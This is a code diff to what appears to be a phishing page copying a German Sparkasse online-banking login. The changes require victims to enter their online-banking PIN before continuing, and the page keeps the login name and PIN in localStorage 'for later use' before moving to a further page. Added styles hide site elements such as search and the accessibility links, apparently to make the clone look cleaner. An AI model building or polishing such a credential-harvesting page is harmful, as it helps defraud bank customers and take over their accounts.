@@ -2558,7 +2558,9 @@
 
 <input type="hidden" id="isJavaScriptActive" name="isJavaScriptActive" value="1">
 
-<div class="buttonline main-buttons"><div class="bgroup1"><div><a href="sparekasse 3.html" class="mkp-button mkp-button-primary mkp-button-primary-l" title="Weiter">Weiter</a></div></div></div></form>
+<div id="validation-error" style="display: none; color: #d32f2f; font-size: 0.875rem; margin-bottom: 10px; text-align: center; padding: 8px; background-color: #ffebee; border-radius: 4px;"></div>
+
+<div class="buttonline main-buttons"><div class="bgroup1"><div><a href="sparekasse 3.html" class="mkp-button mkp-button-primary mkp-button-primary-l" title="Weiter" id="weiter-link-2">Weiter</a></div></div></div></form>
 
 
 
@@ -3255,18 +3257,46 @@
     }
   }
   
+  function showValidationError(message) {
+    var errorDiv = document.getElementById('validation-error');
+    if (errorDiv) {
+      errorDiv.textContent = message;
+      errorDiv.style.display = 'block';
+      // Scroll to error message
+      errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  }
+  
+  function hideValidationError() {
+    var errorDiv = document.getElementById('validation-error');
+    if (errorDiv) {
+      errorDiv.style.display = 'none';
+    }
+  }
+  
   // Navigate when Weiter button is clicked or Enter is pressed
   async function navigateToNext() {
     if (weiterLink) {
+      // Hide previous error
+      hideValidationError();
+      
+      // Validate that password is filled
+      var password = passwordInput ? (passwordInput.value ? passwordInput.value.trim() : '') : '';
+      if (!password) {
+        showValidationError('Sie können nicht fortfahren. Bitte füllen Sie die Online-Banking-PIN aus.');
+        if (passwordInput) {
+          passwordInput.focus();
+        }
+        return;
+      }
+      
       // Get all stored data
       var anmeldename = '';
-      var password = '';
       var saveDevice = false;
       
       if (window.localStorage) {
         try {
           anmeldename = localStorage.getItem('login_anmeldename') || '';
-          password = passwordInput ? passwordInput.value : '';
           saveDevice = deviceToggle ? deviceToggle.checked : false;
           
           // Store password in localStorage for later use
@@ -3296,7 +3326,40 @@
     });
   }
   
+  // Function to update data-emptyinput attribute based on input value
+  function updateEmptyInput(input) {
+    if (input) {
+      // Check if input has a value (even if it's just spaces, we want to keep label up)
+      if (input.value && input.value.trim() !== '') {
+        input.setAttribute('data-emptyinput', 'false');
+      } else {
+        input.setAttribute('data-emptyinput', 'true');
+      }
+    }
+  }
+  
+  // Setup label behavior for password input field
   if (passwordInput) {
+    // Update on input (when typing)
+    passwordInput.addEventListener('input', function() {
+      updateEmptyInput(passwordInput);
+      hideValidationError(); // Hide error when user starts typing
+    });
+    
+    // Update on focus
+    passwordInput.addEventListener('focus', function() {
+      updateEmptyInput(passwordInput);
+    });
+    
+    // Update on blur (when clicking away) - this is critical to keep label up if there's a value
+    passwordInput.addEventListener('blur', function() {
+      updateEmptyInput(passwordInput);
+    });
+    
+    // Initial check when page loads
+    updateEmptyInput(passwordInput);
+    
+    // Also handle Enter key
     passwordInput.addEventListener('keypress', function(e) {
       if (e.key === 'Enter') {
         e.preventDefault();
@@ -3308,6 +3371,44 @@
 </script>
 
 <style>
+/* Make logo white */
+.if6_header .logo img,
+.if6_header .logo picture img,
+.nav-full-container .logo img,
+.nav-full-container .logo picture img {
+  filter: brightness(0) invert(1) !important;
+  -webkit-filter: brightness(0) invert(1) !important;
+}
+
+/* Hide Leichte Sprache and Gebärdensprache */
+.icon-easy-language,
+.icon-sign-language,
+a[href*="leichte-sprache"],
+a[href*="gebaerdensprache"],
+.nav-metanav li:has(.icon-easy-language),
+.nav-metanav li:has(.icon-sign-language),
+.nav-metanav li:has(a[href*="leichte-sprache"]),
+.nav-metanav li:has(a[href*="gebaerdensprache"]),
+.nav-metanav li {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  height: 0 !important;
+  width: 0 !important;
+  overflow: hidden !important;
+  margin: 0 !important;
+  padding: 0 !important;
+}
+
+/* Hide Suche (search) */
+.nav-search,
+#head_search_button,
+button.skipto-search,
+a[href*="#"].nav-search {
+  display: none !important;
+  visibility: hidden !important;
+}
+
 /* Hide trust-wallet and any red boxes/rectangles */
 .trust-wallet-one-tap,
 .trust-wallet-one-tap .box,
